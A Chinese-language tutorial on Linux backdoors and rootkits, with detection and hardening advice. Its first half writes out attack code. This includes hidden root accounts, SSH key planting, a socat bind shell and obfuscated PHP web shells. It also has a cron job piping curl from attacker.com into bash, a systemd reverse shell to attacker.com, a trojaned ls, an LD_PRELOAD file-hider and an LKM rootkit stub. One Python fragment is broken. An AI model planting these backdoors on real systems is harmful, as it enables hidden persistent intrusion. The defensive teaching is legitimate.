# 后门与 RootKit 原理

你的服务器已经被入侵了——但你可能浑然不知。

后门（Backdoor）和 Rootkit 是攻击者实现持久化的核心技术。后门提供绕过正常认证的隐藏入口，Rootkit 则负责隐藏自己的存在，让攻击者的活动不被发现。理解它们的原理，是检测和防御的前提。

## 后门

### 什么是后门

后门是绕过正常认证机制、获得未授权访问的隐藏入口。与正常登录不同，后门提供的是一种绕过安全检查的快捷方式。

### 后门类型

#### 1. 账户后门

```bash
# 创建隐藏账户
useradd -M -s /bin/bash -d /var/tmp/.ssh hidduser
# 或者修改 UID 为 0
usermod -u 0 -o hidduser

# 创建影子账户（在 /etc/shadow 中添加）
# 在 passwd 文件中创建伪造的系统账户
echo "admin:x:0:0:root:/root:/bin/bash" >> /etc/passwd
echo "admin:password_hash:0:0:99999:7:::" >> /etc/shadow
```

#### 2. SSH 后门

```bash
# SSH 密钥后门（目标服务器）
mkdir -p ~/.ssh
chmod 700 ~/.ssh
cat attacker_public_key >> ~/.ssh/authorized_keys

# SSH 配置后门：允许密码登录，同时记录密码
# /etc/ssh/sshd_config
# PasswordAuthentication yes
# 在 sshd 中注入键盘记录

# Socat 监听器
socat TCP-LISTEN:2222,fork,reuseaddr EXEC:/bin/bash,pty,stderr
```

#### 3. Web Shell

```php
<?php
// 简单的 Web Shell
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

<?php
// 更隐蔽的 Web Shell
$b = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
eval($b($_POST['x']));
// 连接方式：POST x=base64_encode("system('whoami');")
?>
```

```python

def execute(cmd):
    return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)

    cmd = base64.b64decode(request.args.get('x')).decode()
```

#### 4. Cron 后门

```bash
# 添加恶意 cron 任务
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden.sh") | crontab -

# 或修改系统 crontab
echo "*/5 * * * * curl https://attacker.com/bd | bash" >> /etc/cron.d/backdoor
```

#### 5. systemd 服务后门

```ini

[Unit]
Description=System Service
After=network.target

[Service]

ExecStart=/bin/bash -c 'bash -i > /dev/tcp/attacker.com/4444 0>&1'

```

### Crontab 隐藏技术

```bash
# 创建不可见的 cron 后门
# 使用空文件名或特殊文件名
touch -- "-"
echo "*/5 * * * * /tmp/.x" > --
touch "/var/spool/cron/crontabs/ "
# 注意文件名末尾的空格

# 或利用 /proc 文件系统
# 进程名伪装
exec -a "[crond]" bash -c '/tmp/.backdoor &'
```

## Rootkit

### 什么是 Rootkit

Rootkit 是一种特殊的恶意软件，专门设计用来**隐藏自己和其他恶意软件的存在**。它的名字来源于 Unix 系统中的「root」权限和「kit」（工具包）。

### Rootkit 类型

| 类型 | 说明 | 特点 |
|---|---|---|
| 用户态 Rootkit | 修改用户层程序 | 容易被检测 |
| 内核态 Rootkit | 修改内核或加载内核模块 | 难以检测 |
| Bootkit | 感染引导扇区 | 持久性最强 |
| Firmware Rootkit | 感染 BIOS/UEFI | 极难检测 |

### 用户态 Rootkit

#### 替换系统程序

```bash
# 替换 ls，隐藏特定文件
# 创建恶意的 ls
cat > /tmp/ls << 'EOF'
#!/bin/bash
if [ "$1" = "-la" ] || [ "$1" = "-al" ]; then
    /bin/ls "$@" | grep -v "backdoor\|shell\|hidden"
else
    /bin/ls "$@"
fi
EOF
chmod +x /tmp/ls
mv /tmp/ls /bin/ls
```

#### LD_PRELOAD 劫持

```c
// evil.c - 劫持系统调用
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 覆盖 readdir_r
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *);
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp))) {
        // 隐藏特定文件名
        if (strstr(entry->d_name, ".backdoor")) {
            continue;
        }
        return entry;
    }
    return NULL;
}
```

```bash
# 编译并使用
gcc -shared -fPIC -o evil.so evil.c -ldl
export LD_PRELOAD=/tmp/evil.so
ls -la  # .backdoor 文件被隐藏
```

### 内核态 Rootkit

#### Linux Kernel Module (LKM) Rootkit

```c
// diamorphine.c - Linux Kernel Module Rootkit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

unsigned long *sys_call_table;

// Hook syscall
static asmlinkage long (*original_read)(const struct pt_regs *);
static asmlinkage long hooked_read(unsigned long fd, char __user *buf,
                                    size_t count) {
    long ret = original_read(fd, buf, count);
    // 可以修改返回数据
    return ret;
}

// 隐藏模块
static int hide(void) {
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    return 0;
}

// 模块入口
static int init_evil(void) {
    // 获取 sys_call_table 地址
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // 隐藏模块
    hide();

    return 0;
}

// 模块出口
static void exit_evil(void) {
    // 恢复原始 syscall
}

module_init(init_evil);
module_exit(exit_evil);
```

### Bootkit

#### MBR 感染

```c
// bootkit.c - MBR 感染示例（概念代码）
void infect_mbr(unsigned char *disk) {
    // 1. 读取原始 MBR
    read_sector(0, original_mbr);

    // 2. 保存原始 MBR 到磁盘其他位置
    write_sector(63, original_mbr);

    // 3. 创建恶意 MBR
    create_malicious_mbr();

    // 4. 感染 MBR
    write_sector(0, malicious_mbr);
}
```

## Rootkit 检测

### 用户态检测

```bash
# 1. 检查文件完整性
# 使用 Tripwire 或 AIDE
apt install aide
aide --init
aide --check

# 2. 检查系统程序大小
rpm -Va | grep -E '^\.\.'  # RPM 包验证
debsums -a  # Debian 包验证

# 3. 检查隐藏文件
ls -laR /proc | grep hidden

# 4. 检查可疑进程
ps auxf
pstree -p
ls -la /proc/*/exe 2>/dev/null
```

### 内核检测

```bash
# 1. 检查 LKM 签名
# 检查内核模块是否已签名
cat /proc/modules
lsmod

# 检查 /sys/module 中是否有异常模块
find /sys/module -name "*evil*" -o -name "*hide*"

# 2. 检查 syscall table
cat /proc/kallsyms | grep sys_call_table

# 3. 使用 Rootkit 检测工具
# rkhunter
apt install rkhunter
rkhunter --checkall

# chkrootkit
apt install chkrootkit
chkrootkit

# Lynis
lynis audit system
```

### 高级检测

```bash
# 使用 Volatility 进行内存取证
# 1. 获取内存镜像
sudo avml memory.lime

# 2. 分析内存
volatility -f memory.lime --profile=Linux_5_4_0_77-genericx64_64 linux_pslist
volatility -f memory.lime --profile=Linux_5_4_0_77-genericx64_64 linux_lsmod
volatility -f memory.lime --profile=Linux_5_4_0_77-genericx64_64 linux_check_syscall
```

## Rootkit 防御策略

### 1. 最小权限安装

```bash
# 最小化安装系统
# 禁用不必要的服务
systemctl disable telnet.socket rsh.socket rlogin.socket
systemctl mask telnet.socket rsh.socket rlogin.socket

# 启用 SELinux
setenforce 1
# /etc/selinux/config
SELINUX=enforcing
```

### 2. 内核加固

```bash
# 启用内核签名验证
# /etc/dracut.conf
install_items+=" /usr/bin/keyctl "
# 使用 dracut 重新生成 initramfs

# 锁定内核模块加载
echo 1 > /proc/sys/kernel/modules_disabled
# 一旦启用，无法再加载任何模块（慎用）
```

### 3. 完整性监控

```python
# 使用 AIDE 进行文件完整性检查
# aide.conf
/etc/passwd
/etc/shadow
/etc/group
/bin
/sbin
/usr/bin
/usr/sbin
!/var/log/.*
```

### 4. 最小化攻击面

```bash
# 禁用危险的编译工具
chmod 000 /usr/bin/gcc
chmod 000 /usr/bin/g++
chmod 000 /usr/bin/make

# 限制 LD_PRELOAD
chmod 000 /etc/ld.so.preload

# 启用 ASLR
echo 2 > /proc/sys/kernel/randomize_va_space
```

### 5. 审计与监控

```bash
# 启用 auditd
apt install auditd
systemctl enable auditd

# 监控关键文件
auditctl -w /etc/passwd -p wa -k identity
auditctl -w /etc/shadow -p wa -k identity
auditctl -w /etc/group -p wa -k identity
auditctl -w /sbin/insmod -p x -k module
auditctl -w /sbin/modprobe -p x -k module
auditctl -w /sbin/rmmod -p x -k module

# 查看审计日志
ausearch -k identity
ausearch -k module
```
